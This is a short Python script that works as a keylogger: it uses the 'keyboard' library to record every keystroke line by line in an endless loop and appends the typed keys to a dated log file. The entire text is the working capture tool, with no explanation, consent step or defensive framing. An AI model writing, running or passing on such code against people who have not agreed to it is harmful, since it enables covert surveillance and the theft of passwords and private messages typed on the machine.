import keyboard
import datetime
now = datetime.datetime.now()
print("Current date and time: ")
name_file = "logs\log_"+str(now)[0:10]
print(name_file)


def lines():
    logss = keyboard.record("enter", True, True)
    outfile = open(name_file, "a")  # create/open the file in append mode
    for item in logss:
        item = str(item)
        if "down" in item:
            item = item[14:]
            item = item[:-6]
            if item != "enter":
                outfile.write(item)
    outfile.write("\n")


while True:
    lines()
